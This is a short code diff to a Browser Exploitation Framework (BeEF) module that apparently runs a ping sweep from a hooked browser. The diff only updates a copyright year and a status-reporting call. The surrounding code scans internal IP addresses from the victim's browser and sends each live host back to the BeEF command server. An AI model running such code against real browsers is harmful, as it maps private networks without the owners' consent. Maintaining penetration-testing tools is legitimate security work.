@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - https://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -57,7 +57,7 @@ beef.execute(function() {
     if(ips.length>1) {
 	    var int_id = setInterval( function() { 
 		var host = do_scan(ips[i++],timeout);
-		if(host!="") beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host='+host, beef.are.status_success());
+		if(host!="") beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host='+host, beef.status.success());
 		if(i==ips.length) { clearInterval(int_id); beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host=Ping sweep finished'); }
     	}, delay);
     } else {
